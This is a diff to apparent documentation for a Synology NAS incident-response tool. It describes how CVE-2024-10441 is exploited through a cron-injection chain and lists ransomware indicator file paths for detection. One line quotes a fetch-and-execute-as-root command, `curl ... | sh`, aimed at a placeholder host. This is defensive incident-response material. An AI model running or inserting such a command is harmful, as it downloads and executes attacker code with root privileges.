@@ -8,7 +8,10 @@ field such as
 
 (CVE-2024-10441, Synology-SA-24:20): the system plugin daemon passes the injected variables on, glibc's
 LD_DEBUG output (which contains the cron line) lands in /etc/cron.d/synot*, and cron runs
-`curl -s http://<IP>/xdy5.sh|sh` as root. Reported follow-ups: /bin/libgld, /bin/qnetd, /bin/l0ck.enc.
+`curl -s http://<IP>/xdy5.sh|sh` as root. Reported follow-ups (dylab.org/archives/1128): xdy5.sh saves the
+encryptor as /bin/qnetd and starts it, downloads /bin/libgld as a backup payload (one victim saw the
+encryption process under that name), and creates /bin/l0ck.enc as a marker so only one encryption process
+runs.
 
 - `exploit_attempts`: the DSM connection log (normal session) for the injection strings and IOC addresses.
 - `nas incident --deep`: COLLECTOR runs once as root (temporary Task Scheduler task, or directly with
